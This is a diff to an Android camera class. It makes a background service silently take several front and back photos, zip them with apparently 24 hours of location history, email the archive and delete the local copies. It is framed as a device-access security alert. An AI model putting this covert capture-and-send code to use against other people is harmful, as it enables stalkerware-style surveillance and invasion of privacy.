@@ -18,7 +18,6 @@ import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.Looper;
 import android.util.Log;
-import android.util.Size;
 import android.view.Surface;
 
 import androidx.annotation.NonNull;
@@ -28,14 +27,17 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
-
 
 public class ServiceCameraCapture {
 
     private static final String TAG = "ServiceCameraCapture";
+    private static final int PHOTOS_PER_CAMERA = 4;
+    private static final long PHOTO_INTERVAL_MS = 50;
 
     private final Context context;
     private CameraManager cameraManager;
@@ -45,8 +47,9 @@ public class ServiceCameraCapture {
     private HandlerThread backgroundThread;
     private CameraCaptureSession captureSession;
     
-    private String backPhotoPath;
-    private String frontPhotoPath;
+    private List<String> backPhotoPaths = new ArrayList<>();
+    private List<String> frontPhotoPaths = new ArrayList<>();
+    private int currentPhotoCount = 0;
     private boolean isCapturing = false;
     private CaptureCallback callback;
 
@@ -68,11 +71,12 @@ public class ServiceCameraCapture {
         
         this.callback = callback;
         this.isCapturing = true;
-        this.backPhotoPath = null;
-        this.frontPhotoPath = null;
+        this.backPhotoPaths.clear();
+        this.frontPhotoPaths.clear();
+        this.currentPhotoCount = 0;
 
         Log.d(TAG, "=== STARTING SERVICE-BASED CAMERA CAPTURE ===");
-        Log.d(TAG, "No Activity needed - capturing directly from service");
+        Log.d(TAG, "Will capture " + PHOTOS_PER_CAMERA + " photos per camera with " + PHOTO_INTERVAL_MS + "ms interval");
         
         startBackgroundThread();
         
@@ -86,23 +90,10 @@ public class ServiceCameraCapture {
         backgroundHandler = new Handler(backgroundThread.getLooper());
     }
 
-    private void stopBackgroundThread() {
-        if (backgroundThread != null) {
-            backgroundThread.quitSafely();
-            try {
-                backgroundThread.join(1000); // Wait max 1 second
-            } catch (InterruptedException e) {
-                Log.e(TAG, "Error stopping background thread", e);
-            } finally {
-                backgroundThread = null;
-                backgroundHandler = null;
-            }
-        }
-    }
-
     private void captureFromCamera(boolean isFront) {
         String cameraName = isFront ? "FRONT" : "BACK";
-        Log.d(TAG, "Capturing from " + cameraName + " camera");
+        Log.d(TAG, "Starting capture from " + cameraName + " camera");
+        currentPhotoCount = 0;
 
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "Camera permission not granted");
@@ -116,7 +107,7 @@ public class ServiceCameraCapture {
                 Log.e(TAG, cameraName + " camera not found");
                 if (!isFront) {
 
-                    backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                    backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
                 } else {
                     finishCapture(null);
                 }
@@ -138,7 +129,7 @@ public class ServiceCameraCapture {
                     Log.e(TAG, cameraName + " camera disconnected");
                     camera.close();
                     if (!isFront) {
-                        backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                        backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
                     } else {
                         finishCapture(null);
                     }
@@ -149,7 +140,7 @@ public class ServiceCameraCapture {
                     Log.e(TAG, cameraName + " camera error: " + error);
                     camera.close();
                     if (!isFront) {
-                        backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                        backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
                     } else {
                         finishCapture(null);
                     }
@@ -159,7 +150,7 @@ public class ServiceCameraCapture {
         } catch (CameraAccessException e) {
             Log.e(TAG, "Camera access exception", e);
             if (!isFront) {
-                backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
             } else {
                 finishCapture(e.getMessage());
             }
@@ -184,7 +175,7 @@ public class ServiceCameraCapture {
     private void createCaptureSession(boolean isFront) {
         try {
 
-            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
+            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, PHOTOS_PER_CAMERA + 1);
             
             imageReader.setOnImageAvailableListener(reader -> {
                 Image image = null;
@@ -195,13 +186,16 @@ public class ServiceCameraCapture {
                         byte[] bytes = new byte[buffer.remaining()];
                         buffer.get(bytes);
                         
-                        String path = saveImage(bytes, isFront);
-                        if (isFront) {
-                            frontPhotoPath = path;
-                        } else {
-                            backPhotoPath = path;
+                        String path = saveImage(bytes, isFront, currentPhotoCount);
+                        if (path != null) {
+                            if (isFront) {
+                                frontPhotoPaths.add(path);
+                            } else {
+                                backPhotoPaths.add(path);
+                            }
+                            Log.d(TAG, (isFront ? "Front" : "Back") + " photo " + (currentPhotoCount + 1) + " saved: " + path);
                         }
-                        Log.d(TAG, (isFront ? "Front" : "Back") + " photo saved: " + path);
+                        currentPhotoCount++;
                     }
                 } finally {
                     if (image != null) {
@@ -210,13 +204,19 @@ public class ServiceCameraCapture {
                 }
                 
 
-                closeCamera();
-                
+                if (currentPhotoCount < PHOTOS_PER_CAMERA) {
 
-                if (!isFront) {
-                    backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
+                    backgroundHandler.postDelayed(() -> takePicture(isFront), PHOTO_INTERVAL_MS);
                 } else {
-                    finishCapture(null);
+
+                    closeCamera();
+                    if (!isFront) {
+
+                        backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
+                    } else {
+
+                        finishCapture(null);
+                    }
                 }
             }, backgroundHandler);
 
@@ -234,7 +234,7 @@ public class ServiceCameraCapture {
                             captureSession = session;
                             
 
-                            backgroundHandler.postDelayed(() -> takePicture(isFront), 500);
+                            backgroundHandler.postDelayed(() -> takePicture(isFront), 300);
                         }
 
                         @Override
@@ -242,7 +242,7 @@ public class ServiceCameraCapture {
                             Log.e(TAG, "Capture session configuration failed");
                             closeCamera();
                             if (!isFront) {
-                                backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                                backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
                             } else {
                                 finishCapture(null);
                             }
@@ -255,7 +255,7 @@ public class ServiceCameraCapture {
             Log.e(TAG, "Error creating capture session", e);
             closeCamera();
             if (!isFront) {
-                backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
             } else {
                 finishCapture(e.getMessage());
             }
@@ -269,7 +269,7 @@ public class ServiceCameraCapture {
                 return;
             }
 
-            Log.d(TAG, "Taking picture: " + (isFront ? "FRONT" : "BACK"));
+            Log.d(TAG, "Taking picture " + (currentPhotoCount + 1) + "/" + PHOTOS_PER_CAMERA + ": " + (isFront ? "FRONT" : "BACK"));
 
             CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
             captureBuilder.addTarget(imageReader.getSurface());
@@ -284,7 +284,7 @@ public class ServiceCameraCapture {
                 public void onCaptureCompleted(@NonNull CameraCaptureSession session, 
                                                @NonNull CaptureRequest request, 
                                                @NonNull TotalCaptureResult result) {
-                    Log.d(TAG, "Capture completed: " + (isFront ? "FRONT" : "BACK"));
+                    Log.d(TAG, "Capture completed: " + (isFront ? "FRONT" : "BACK") + " #" + (currentPhotoCount + 1));
                 }
             }, backgroundHandler);
 
@@ -292,16 +292,16 @@ public class ServiceCameraCapture {
             Log.e(TAG, "Error taking picture", e);
             closeCamera();
             if (!isFront) {
-                backgroundHandler.postDelayed(() -> captureFromCamera(true), 500);
+                backgroundHandler.postDelayed(() -> captureFromCamera(true), 300);
             } else {
                 finishCapture(e.getMessage());
             }
         }
     }
 
-    private String saveImage(byte[] bytes, boolean isFront) {
+    private String saveImage(byte[] bytes, boolean isFront, int photoIndex) {
         String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
-        String fileName = (isFront ? "front_" : "back_") + timestamp + ".jpg";
+        String fileName = (isFront ? "front_" : "back_") + timestamp + "_" + (photoIndex + 1) + ".jpg";
         File photoFile = new File(context.getExternalFilesDir(null), fileName);
 
         try (FileOutputStream fos = new FileOutputStream(photoFile)) {
@@ -335,12 +335,13 @@ public class ServiceCameraCapture {
 
     private void finishCapture(String error) {
         Log.d(TAG, "=== finishCapture START ===");
-        Log.d(TAG, "Back photo: " + backPhotoPath);
-        Log.d(TAG, "Front photo: " + frontPhotoPath);
+        Log.d(TAG, "Back photos: " + backPhotoPaths.size());
+        Log.d(TAG, "Front photos: " + frontPhotoPaths.size());
 
 
-        final String backPath = backPhotoPath;
-        final String frontPath = frontPhotoPath;
+        final List<String> allPhotoPaths = new ArrayList<>();
+        allPhotoPaths.addAll(backPhotoPaths);
+        allPhotoPaths.addAll(frontPhotoPaths);
 
         closeCamera();
         isCapturing = false;
@@ -353,31 +354,58 @@ public class ServiceCameraCapture {
         }
 
 
-        new Handler(Looper.getMainLooper()).post(() -> {
-            if (backPath != null || frontPath != null) {
-                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
-                String subject = "⚠️ ALERT: Screen Activated - " + timestamp;
+        new Thread(() -> {
+            if (!allPhotoPaths.isEmpty()) {
+                Log.d(TAG, ">>> Creating encrypted ZIP with " + allPhotoPaths.size() + " photos + 24h locations from backend");
 
-                if (backPath != null) {
-                    Log.d(TAG, ">>> Calling GMailSender for BACK photo");
-                    GMailSender.sendEmailWithAttachment(backPath, subject + " [BACK]");
-                }
-                if (frontPath != null) {
-                    Log.d(TAG, ">>> Calling GMailSender for FRONT photo");
-                    GMailSender.sendEmailWithAttachment(frontPath, subject + " [FRONT]");
+                String zipPath = ZipCreator.createSecurityZip(context, allPhotoPaths);
+
+                if (zipPath != null) {
+                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
+                    String subject = "🚨 SECURITY ALERT: Device Accessed - " + timestamp;
+
+                    Log.d(TAG, ">>> Sending ONE encrypted ZIP via email");
+                    GMailSender.sendEmailWithZip(zipPath, subject);
+
+
+                    for (String photoPath : allPhotoPaths) {
+                        try {
+                            new File(photoPath).delete();
+                            Log.d(TAG, "Deleted individual photo: " + photoPath);
+                        } catch (Exception e) {
+                            Log.w(TAG, "Failed to delete photo: " + photoPath);
+                        }
+                    }
+                } else {
+                    Log.e(TAG, "Failed to create ZIP, sending individual photos as fallback");
+
+                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
+                    String subject = "⚠️ ALERT: Screen Activated - " + timestamp;
+
+                    for (int i = 0; i < allPhotoPaths.size(); i++) {
+                        String path = allPhotoPaths.get(i);
+                        Log.d(TAG, ">>> Sending photo " + (i + 1) + " as fallback");
+                        GMailSender.sendEmailWithAttachment(path, subject + " [Photo #" + (i + 1) + "]");
+                    }
                 }
             } else {
                 Log.w(TAG, "No photos to send!");
             }
 
-            if (callback != null) {
-                if (error != null) {
-                    callback.onCaptureFailed(error);
-                } else {
-                    callback.onCaptureComplete(backPath, frontPath);
+
+            new Handler(Looper.getMainLooper()).post(() -> {
+                if (callback != null) {
+                    if (error != null) {
+                        callback.onCaptureFailed(error);
+                    } else {
+                        String backPath = backPhotoPaths.isEmpty() ? null : backPhotoPaths.get(0);
+                        String frontPath = frontPhotoPaths.isEmpty() ? null : frontPhotoPaths.get(0);
+                        callback.onCaptureComplete(backPath, frontPath);
+                    }
                 }
-            }
+            });
+
             Log.d(TAG, "=== finishCapture END ===");
-        });
+        }).start();
     }
 }
